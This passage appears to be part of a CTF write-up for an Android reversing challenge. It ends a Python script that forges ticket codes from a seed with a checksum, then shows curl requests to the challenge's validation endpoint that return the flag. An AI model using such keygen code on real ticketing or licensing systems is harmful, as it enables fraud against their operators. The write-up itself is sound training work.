+        <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">25</span><span class="p">))</span> <span class="o">%</span> <span class="mi">24</span>
+        <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ALPHABET</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">idx</span><span class="p">)])</span>
+
+    <span class="n">core</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">sb</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"-"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+    <span class="n">checksum</span> <span class="o">=</span> <span class="n">calculate_checksum</span><span class="p">(</span><span class="n">core</span><span class="p">)</span> <span class="o">%</span> <span class="mi">10</span>
+    <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">checksum</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">sb</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="kn">import</span> <span class="nn">argparse</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"seed"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"secretSeed as integer (long)"</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">generate_ticket</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">seed</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>and then furthermore we can do the smart thing and statically reverse to find out the exact json parameters the remote server is expecting or we can just, yknow, assume the error code will tell us so we can skip a bunch of static reversing (who the fuck wants to read java! ew!)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="o">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s">'https://us-central1-christmas-lottery-b838b.cloudfunctions.net/validate'</span> <span class="o">-</span><span class="n">H</span> <span class="s">'Content-Type: application/json'</span> <span class="o">-</span><span class="n">d</span> <span class="s">'{"idToken":"..."}'</span>
+<span class="p">{</span><span class="s">"error"</span><span class="p">:</span><span class="s">"Missing ticketCode or idToken"</span><span class="p">}</span> 
+</code></pre></div></div>
+
+<p>NUMBER ONE GUIDE TO REV: NEVER THINK ABOUT ANYTHING EVER JUST WHACK</p>
+
+<p>with that, we can specify that the json field is <code class="language-plaintext highlighter-rouge">ticketCode</code> and fill in our code accordingly.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="o">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s">'https://us-central1-christmas-lottery-b838b.cloudfunctions.net/validate'</span> <span class="o">-</span><span class="n">H</span> <span class="s">'Content-Type: application/json'</span> <span class="o">-</span><span class="n">d</span> <span class="s">'{"idToken":"...", "ticketCode":"LPB-0899-AA8"}'</span>
+<span class="p">{</span><span class="s">"flag"</span><span class="p">:</span><span class="s">"HEX{Fr1d4_i5_S4nT4s_b3sT_fRi3nD}"</span><span class="p">,</span><span class="s">"message"</span><span class="p">:</span><span class="s">"Valid ticket!"</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>flag: <code class="language-plaintext highlighter-rouge">HEX{Fr1d4_i5_S4nT4s_b3sT_fRi3nD}</code></p>
+
+<p>a personal note: the flag mentions Frida. i,, uhh, i simply just did not Frida, at all! i’ve basically always statically whacked any android reversing because the thought of setting up an emulator makes me cringe. perhaps one day i will learn!</p>
+
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
